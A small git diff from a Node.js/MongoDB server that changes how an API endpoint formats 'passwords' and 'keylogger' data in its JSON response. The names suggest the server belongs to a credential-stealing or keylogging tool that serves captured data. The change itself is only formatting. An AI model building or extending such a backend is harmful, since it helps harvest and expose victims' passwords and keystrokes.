@@ -764,7 +764,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 					res.setHeader('Content-Type', 'application/json')
 				}
 				if (json.passwords && json.keylogger) {
-					json = JSON.stringify(json.passwords, null, "    ") + ",\n" + JSON.stringify(json.keylogger, null, "    ")
+					json = "{" + JSON.stringify(json.passwords, null, "    ").slice(1, -1) + "},\n{" + JSON.stringify(json.keylogger, null, "    ").slice(1, -1) + "}"
 					res.send(json)
 					console.log(
 						chalk.greenBright("[API] ") +
